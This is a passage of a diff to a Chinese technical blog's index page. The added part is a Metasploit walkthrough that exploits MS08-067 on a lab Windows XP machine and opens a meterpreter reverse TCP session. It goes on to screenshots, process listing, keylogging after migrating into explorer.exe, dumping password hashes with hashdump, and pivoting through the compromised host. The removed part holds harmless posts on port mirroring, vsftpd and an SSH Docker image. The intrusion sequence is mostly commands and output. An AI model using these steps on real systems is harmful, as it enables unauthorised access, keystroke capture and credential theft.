(BROWSER, SRVSVC)</div><div class="line"></div><div class="line"></div><div class="line">Payload options (windows/meterpreter/reverse_tcp):</div><div class="line"></div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="string">''</span>, seh, thread, process, none)</div><div class="line">   LHOST                      yes       The listen address</div><div class="line">   LPORT     4444             yes       The listen port</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Automatic Targeting</div></pre></td></tr></table></figure>
+<h1 id="Set-Option"><a href="#Set-Option" class="headerlink" title="Set Option"></a>Set Option</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms08_067_netapi) &gt; <span class="built_in">set</span> RhOST 192.168.1.43</div><div class="line">RhOST =&gt; 192.168.1.43</div><div class="line">msf exploit(ms08_067_netapi) &gt; <span class="built_in">set</span> LHOST 192.168.1.8</div><div class="line">LHOST =&gt; 192.168.1.8</div></pre></td></tr></table></figure>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">msf exploit(ms08_067_netapi) &gt; exploit</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.1.8:4444</div><div class="line">[*] Automatically detecting the target...</div><div class="line">[*] Fingerprint: Windows XP - Service Pack 3 - lang:English</div><div class="line">[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)</div><div class="line">[*] Attempting to trigger the vulnerability...</div><div class="line">[*] Sending stage (957487 bytes) to 192.168.1.43</div><div class="line">[*] Meterpreter session 1 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1115) at 2016-06-03 14:18:57 +0800</div><div class="line"></div><div class="line">meterpreter &gt; ls</div><div class="line">Listing: C:\WINDOWS\system32</div><div class="line">============================</div><div class="line"></div><div class="line">Mode              Size      Type  Last modified              Name</div><div class="line">----              ----      ----  -------------              ----</div><div class="line">100666/rw-rw-rw-  1482      fil   2011-08-14 13:40:01 +0800  <span class="variable">$winnt</span>$.inf</div><div class="line">40777/rwxrwxrwx   0         dir   2011-08-14 21:19:31 +0800  1025</div></pre></td></tr></table></figure>
+<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; shell</div><div class="line">Process 1004 created.</div><div class="line">Channel 1 created.</div><div class="line">Microsoft Windows XP [Version 5.1.2600]</div><div class="line">(C) Copyright 1985-2001 Microsoft Corp.</div><div class="line"></div><div class="line">C:\WINDOWS\system32&gt;ipconfig</div><div class="line">ipconfig</div><div class="line"></div><div class="line">Windows IP Configuration</div><div class="line"></div><div class="line"></div><div class="line">Ethernet adapter Local Area Connection:</div><div class="line"></div><div class="line">        Connection-specific DNS Suffix  . :</div><div class="line">        IP Address. . . . . . . . . . . . : 192.168.1.43</div><div class="line">        Subnet Mask . . . . . . . . . . . : 255.255.255.0</div><div class="line">        Default Gateway . . . . . . . . . : 192.168.1.1</div><div class="line"></div><div class="line">C:\WINDOWS\system32&gt;</div></pre></td></tr></table></figure>
+<h1 id="常用手法"><a href="#常用手法" class="headerlink" title="常用手法"></a>常用手法</h1><h2 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; screenshot</div><div class="line">Screenshot saved to: /root/Fyjiynwg.jpeg</div></pre></td></tr></table></figure>
+<h2 id="获取系统信息"><a href="#获取系统信息" class="headerlink" title="获取系统信息"></a>获取系统信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; sysinfo</div><div class="line">Computer        : DH-CA8822AB9589</div><div class="line">OS              : Windows XP (Build 2600, Service Pack 3).</div><div class="line">Architecture    : x86</div><div class="line">System Language : en_US</div><div class="line">Domain          : WORKGROUP</div><div class="line">Logged On Users : 2</div><div class="line">Meterpreter     : x86/win32</div></pre></td></tr></table></figure>
+<h2 id="目标系统正在运行的进程"><a href="#目标系统正在运行的进程" class="headerlink" title="目标系统正在运行的进程"></a>目标系统正在运行的进程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; ps</div><div class="line"></div><div class="line">Process List</div><div class="line">============</div><div class="line"></div><div class="line"> PID   PPID  Name                  Arch  Session  User                           Path</div><div class="line"> ---   ----  ----                  ----  -------  ----                           ----</div><div class="line"> 0     0     [System Process]                                                    </div><div class="line"> 4     0     System                x86   0        NT AUTHORITY\SYSTEM            </div><div class="line"> 128   676   VMUpgradeHelper.exe   x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\VMUpgradeHelper.exe</div><div class="line"> 560   4     smss.exe              x86   0        NT AUTHORITY\SYSTEM            \SystemRoot\System32\smss.exe</div></pre></td></tr></table></figure>
+<h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><blockquote>
+<p>使用migrate将会话迁移至explorer.exe(pid)进程中再启动keylog_recorder模块，需要终止时CTRL+C</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; migrate 1652</div><div class="line">[*] Migrating from 1032 to 1652...</div><div class="line">[*] Migration completed successfully.</div><div class="line">meterpreter &gt; run post/windows/capture/keylog_recorder</div><div class="line"></div><div class="line">[*] Executing module against DH-CA8822AB9589</div><div class="line">[*] Starting the keystroke sniffer...</div><div class="line">[*] Keystrokes being saved <span class="keyword">in</span> to /root/.msf7/loot/20160603143131_default_192.168.1.43_host.windows.key_581630.txt</div><div class="line">[*] Recording keystrokes...</div><div class="line">^C[*] Saving last few keystrokes...</div><div class="line">[*] Interrupt</div><div class="line">[*] Stopping keystroke sniffer...</div></pre></td></tr></table></figure>
+<h2 id="获取密码哈希值"><a href="#获取密码哈希值" class="headerlink" title="获取密码哈希值"></a>获取密码哈希值</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; hashdump</div><div class="line">Administrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</div><div class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</div><div class="line">HelpAssistant:1000:32f842845a64f17ccbe6b10315169b7e:83789c0d8506a618d815fd9c6fb379e1:::</div><div class="line">IUSR_DH-CA8822AB9589:1003:de8b8cec054052bb8ab2d451a3e61856:145f992fa5ff125301520f8e27419c6d:::</div><div class="line">IWAM_DH-CA8822AB9589:1004:90b05d38a1<span class="built_in">fc</span>8d80a4ae31c7bc961352:2f950167d2942f7c977fdfd1857b8a59:::</div><div class="line">SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bb5a5a239a6e521be591fdf091b05013:::</div><div class="line">meterprete</div></pre></td></tr></table></figure>
+<h2 id="将目标机器作为跳板"><a href="#将目标机器作为跳板" class="headerlink" title="将目标机器作为跳板"></a>将目标机器作为跳板</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; run get_local_subnets</div><div class="line">Local subnet: 192.168.1.0/255.255.255.0</div><div class="line">meterpreter &gt; background</div><div class="line">[*] Backgrounding session 1...</div><div class="line">msf exploit(ms08_067_netapi) &gt; route add 192.168.3.0 255.255.255.0 1</div><div class="line">[*] Route added</div><div class="line">msf exploit(ms08_067_netapi) &gt; route <span class="built_in">print</span></div><div class="line"></div><div class="line">Active Routing Table</div><div class="line">====================</div><div class="line"></div><div class="line">   Subnet             Netmask            Gateway</div><div class="line">   ------             -------            -------</div><div class="line">   192.168.3.0        255.255.255.0      Session 1</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/Test-MS08-067/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-Metasploit-MIDI文件解析远程代码执行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1050,315 +1328,9 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-旁路镜像、端口镜像、旁路监控" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/devops/旁路镜像、端口镜像、旁路监控/">旁路镜像、端口镜像、旁路监控</a>
-    </h1>
-  
-
-        
-        <a href="/devops/旁路镜像、端口镜像、旁路监控/" class="archive-article-date">
-  	<time datetime="2016-03-20T02:27:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-03-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="常见的网络监控模式可以分为两种"><a href="#常见的网络监控模式可以分为两种" class="headerlink" title="常见的网络监控模式可以分为两种"></a>常见的网络监控模式可以分为两种</h1><blockquote>
-<p>一种是旁路监控模式<br> 另一种是串联监控模式。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。</div></pre></td></tr></table></figure>
-<h2 id="旁路模式的优缺点"><a href="#旁路模式的优缺点" class="headerlink" title="旁路模式的优缺点"></a>旁路模式的优缺点</h2><blockquote>
-<p>优点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">旁路监控模式部署起来比较灵活方便，只需要在交换机上面配置镜像端口即可。不会影响现有的网络结构。而串联模式一般要作为网关、网桥或者代理服务器，所以需要对现有网络结构进行变动。</div><div class="line">旁路模式分析的是镜像端口拷贝过来的数据，对原始传递的数据包不会造成延时，不会对网速造成任何影响。而串联模式是串联在网络中的，那么所有的数据必须先经过监控系统，通过监控系统的分析检查之后，才能够发送到各个客户端，所以会对网速有一定的延时。</div><div class="line">旁路监控设备一旦故障或者停止运行，不会影响现有网络。而串联监控设备如果出现故障，会导致网络中断。</div></pre></td></tr></table></figure></p>
-<p>缺点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">需要交换机或者路由支持“端口镜像”功能才可以实现监控。</div><div class="line">旁路模式采用发送RST包的方式来断开TCP连接，不能禁止UDP通讯。对于UDP应用，一般还需要在路由器上面禁止UDP端口进行配合。而串联模式不存在该问题。</div></pre></td></tr></table></figure></p>
-</blockquote>
-<h2 id="串联模式的优缺点"><a href="#串联模式的优缺点" class="headerlink" title="串联模式的优缺点"></a>串联模式的优缺点</h2><blockquote>
-<p>优点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">利用windows自带的“网关”、“网桥”功能即可实现，不需要硬件设备的支持。</div><div class="line">可以禁止UDP通讯数据包。</div></pre></td></tr></table></figure></p>
-<p>缺点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">需要更改现有的网络结构。</div><div class="line">与“旁路监控”相比较，“网关”、“网桥”的配置更加复杂些。</div><div class="line">由于是串联模式，当局域网电脑台数多时，对网速有少许的影响。这个主要取决于电脑的硬件配置。</div></pre></td></tr></table></figure></p>
-</blockquote>
-<h2 id="交换机镜像端口配置"><a href="#交换机镜像端口配置" class="headerlink" title="交换机镜像端口配置"></a>交换机镜像端口配置</h2><blockquote>
-<p>用户模式：查看初始化相关信息<br>特权模式：查看所有信息、调试、保持配置信息<br>全局模式：配置所有信息、针对整个路由器或交换机的所有接口<br>接口模式：针对某一个接口的配置<br>线控模式：对路由器进行控制的接口配置</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sw-1#show monitor      检查是否已存在镜像的配置</div><div class="line">sw-1#conf t                    进入全局模式</div><div class="line">sw-1&lt;config&gt;#monitor session 2 source int f0/12 both         监控端口f0/12（外网口或叫被镜像端口）  both代表双向监听数据   rx代表接收数据   tx代表发送数据</div><div class="line">sw-1&lt;config&gt;#monitor session 2 destination int f0/24         把信息复制到f0/24（镜像端口）</div><div class="line">sw-1&lt;config&gt;#end        返回</div><div class="line">sw-1#show monitor session 2</div><div class="line">把F0/12 进来的出去的数据复制一份给F0/24，这样我们在晟为就可以截取到数据了。</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">others</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/devops/" class="article-tag-list-link color2">devops</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/devops/旁路镜像、端口镜像、旁路监控/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-Centos-vsftpd" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/devops/Centos-vsftpd/">Centos vsftpd</a>
-    </h1>
-  
-
-        
-        <a href="/devops/Centos-vsftpd/" class="archive-article-date">
-  	<time datetime="2016-03-14T13:27:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-03-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="安装vsftpd"><a href="#安装vsftpd" class="headerlink" title="安装vsftpd"></a>安装vsftpd</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install vsftpd</div></pre></td></tr></table></figure>
-<h1 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a>设置开机启动</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chkconfig vsftpd on</div></pre></td></tr></table></figure>
-<h1 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service vsftpd start</div></pre></td></tr></table></figure>
-<h1 id="添加用户组和用户"><a href="#添加用户组和用户" class="headerlink" title="添加用户组和用户"></a>添加用户组和用户</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groupadd ftp</div></pre></td></tr></table></figure>
-<blockquote>
-<p>mkdir /srv/ftp/test<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">useradd -g ftp -M -d /srv/ftp/test -s /sbin/nologin test</div></pre></td></tr></table></figure></p>
-<p>-g接的是用户组<br>-M表示不设置它的主目录，假设如果没有-M，则在/home下会有跟用户名(zhujin)一样的目录。<br>-d后面接的是用zhujin登陆FTP的时候，它的初始目录。<br>-s 后面接/sbin/nologin表示用户不需要登录系统，因为我们只需要用来登陆FTP<br>zhujin表示用户名了</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">passwd <span class="built_in">test</span></div></pre></td></tr></table></figure>
-<h1 id="修改目录权限"><a href="#修改目录权限" class="headerlink" title="修改目录权限"></a>修改目录权限</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chown -R <span class="built_in">test</span>:ftp /srv/ftp/<span class="built_in">test</span></div><div class="line">/etc/init.d/vsftpd restart</div></pre></td></tr></table></figure>
-<h1 id="相关安全设置"><a href="#相关安全设置" class="headerlink" title="相关安全设置"></a>相关安全设置</h1><blockquote>
-<p>防止跨目录<br>在/etc/vsftpd/vsftpd.conf 下添加</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chroot_list_enable=YES</div><div class="line">chroot_list_file=/etc/vsftpd/chroot_list</div></pre></td></tr></table></figure>
-<blockquote>
-<p>把想要限制的用户写入/etc/vsftpd/chroot_list文件中再重启vsftp服务即可</p>
-<h1 id="禁止匿名登录"><a href="#禁止匿名登录" class="headerlink" title="禁止匿名登录"></a>禁止匿名登录</h1></blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">anonymous_enable=NO</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/devops/" class="article-tag-list-link color2">devops</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/devops/Centos-vsftpd/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-Docker-SSH" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/virtualization/Docker-SSH/">Docker-SSH</a>
-    </h1>
-  
-
-        
-        <a href="/virtualization/Docker-SSH/" class="archive-article-date">
-  	<time datetime="2016-01-20T11:55:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-01-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><blockquote>
-<p>使用一个ubuntu，配置好ssh服务再打包成image</p>
-<h1 id="使用commit构建"><a href="#使用commit构建" class="headerlink" title="使用commit构建"></a>使用commit构建</h1><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>docker run -it ubuntu:14.04 /bin/bash<br>更新镜像并安装ssh-server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get updte</div><div class="line">apt-get install openssh-server</div></pre></td></tr></table></figure></p>
-<p>配置ssh</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mkdir -p /var/run/sshd</div><div class="line">/usr/sbin/sshd -D &amp;</div></pre></td></tr></table></figure>
-<blockquote>
-<p>检查ssh是否运行成功的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -tunlp</div></pre></td></tr></table></figure></p>
-<p>pam登录限制<br>vim /etc/pam.d/sshd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">注释掉</div><div class="line">session required pam_loginuid.so的</div></pre></td></tr></table></figure></p>
-<p>如果要使用密码进行ssh认证的话<br>vim /etc/ssh/sshd_config<br>取消注释<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PasswordAuthentication yes</div></pre></td></tr></table></figure></p>
-<p>使用密钥认证的话<br>在auchorized_keys文件中写入ssh client的id_rsa.pub内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mkdir /root/.ssh</div><div class="line">vi /root/.ssh/auchorized_keys</div></pre></td></tr></table></figure></p>
-<p>创建自动启动SSH脚本</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vi /run.sh</div><div class="line">chmod +x run.sh</div></pre></td></tr></table></figure>
-<blockquote>
-<p>文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">/usr/sbin/sshd -D</div></pre></td></tr></table></figure></p>
-<p>退出容器</p>
-<h2 id="保存镜像"><a href="#保存镜像" class="headerlink" title="保存镜像"></a>保存镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker commit eb6bf1856445 sshd:ubuntu2</div></pre></td></tr></table></figure>
-<p>查看生成的镜像<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  .ssh docker images sshd:ubuntu2</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">sshd                ubuntu2             d9a07f6fd3f8        34 minutes ago      283.6 MB</div></pre></td></tr></table></figure></p>
-</blockquote>
-<h2 id="使用SSH-Server镜像"><a href="#使用SSH-Server镜像" class="headerlink" title="使用SSH Server镜像"></a>使用SSH Server镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -p 10000:22 -d sshd:ubuntu2 /run.sh</div></pre></td></tr></table></figure>
-<blockquote>
-<p>镜像启动成功</p>
-<p>使用密码登录成功</p>
-</blockquote>
-<p><img src="https://ww3.sinaimg.cn/large/006tNc79gy1fdtgpatq43j30jc0d90tu.jpg" alt="使用密码登录"></p>
-<blockquote>
-<p>使用密钥登录成功</p>
-</blockquote>
-<p><img src="https://ww3.sinaimg.cn/large/006tNc79gy1fdtgpz1xerj30jv0dhwfw.jpg" alt="使用密钥登录成功"></p>
-<h1 id="使用Dockerfile构建"><a href="#使用Dockerfile构建" class="headerlink" title="使用Dockerfile构建"></a>使用Dockerfile构建</h1><blockquote>
-<p>在宿主主机中创建相关文件</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir test_ssh_in_docker</div><div class="line">cd test_ssh_in_docker</div><div class="line">touch Dockerfile run.sh</div></pre></td></tr></table></figure>
-<blockquote>
-<p>cat run.sh</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vi /run.sh</div><div class="line">chmod +x run.sh</div></pre></td></tr></table></figure>
-<blockquote>
-<p>cat Dockerfile</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">➜  test_ssh_in_docker cat Dockerfile</div><div class="line">FROM ubuntu:14.04</div><div class="line"></div><div class="line">MAINTAINER by tp.</div><div class="line"></div><div class="line">RUN apt-get -qq update -y</div><div class="line"></div><div class="line"><span class="comment">#install SSH-Server</span></div><div class="line">RUN apt-get -qq install openssh-server -y</div><div class="line">RUN mkdir -p /var/run/sshd</div><div class="line">RUN mkdir -p /root/.ssh</div><div class="line">RUN sed -ri <span class="string">'s/session required pam_loginuid.so/#session required pam.loginuid.so/g'</span> /etc/pam.d/sshd</div><div class="line"></div><div class="line"><span class="comment">#copy ssh server config file</span></div><div class="line">ADD authorized_keys /root/.ssh/authorized_keys</div><div class="line">ADD run.sh /run.sh</div><div class="line">RUN chmod 755 /run.sh</div><div class="line"></div><div class="line"><span class="comment">#open ssh port</span></div><div class="line">EXPOSE 22</div><div class="line"></div><div class="line"><span class="comment">#start sshd server</span></div><div class="line">CMD [<span class="string">"/run.sh"</span>]</div></pre></td></tr></table></figure>
-<blockquote>
-<p>目录下所有文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  test_ssh_in_docker ls</div><div class="line">authorized_keys  Dockerfile  run.sh</div></pre></td></tr></table></figure></p>
-<p>build镜像<br>➜  test_ssh_in_docker docker build -t sshd:dockerfile3 .</p>
-</blockquote>
-<p><img src="https://ww3.sinaimg.cn/large/006tNc79gy1fdtgqdrgbzj30rh0kv75x.jpg" alt="build镜像"></p>
-<blockquote>
-<p>创建容器并SSH<br>docker run -d -p 10244:22 sshd:dockerfile3<br>ssh 127.0.0.1 -p 10244</p>
-</blockquote>
-<p><img src="https://ww3.sinaimg.cn/large/006tNc79gy1fdtgqpn3s4j310l0dcq50.jpg" alt="ssh success"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Docker</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">虚拟化</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
